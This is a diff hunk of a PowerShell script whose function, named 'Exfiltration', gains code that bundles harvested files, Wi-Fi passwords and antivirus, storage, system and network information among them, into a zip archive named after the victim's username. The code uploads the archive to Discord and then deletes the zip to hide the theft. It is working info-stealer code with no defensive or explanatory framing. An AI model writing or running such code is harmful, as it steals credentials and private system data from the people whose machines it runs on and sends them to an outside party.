@@ -62,6 +62,19 @@ function Exfiltration {
 
     #Call NetworkInfo
     NetworkInfo
+
+
+      # Create a zip archive with the specified files
+    $timestamp = (Get-Date).ToString("dd_MM_yyyy_HHmm")
+    $zipFileName = "Exfil_$env:USERNAME_$timestamp.zip"
+    $zipFilePath = Join-Path "C:\temp" $zipFileName
+    Compress-Archive -Path "C:\temp\AntiSpyware.txt", "C:\temp\Wifi_Passwords.txt", "C:\temp\Storage_Info.txt", "C:\temp\System_Informations.txt", $networkInfoPath -DestinationPath $zipFilePath
+
+    # Upload the zip archive to Discord
+    Upload-Discord -file $zipFilePath -text "Exfiltration Archive :"
+
+    # Remove the zip file
+    Remove-Item -Path $zipFilePath -Force
     
 }
 
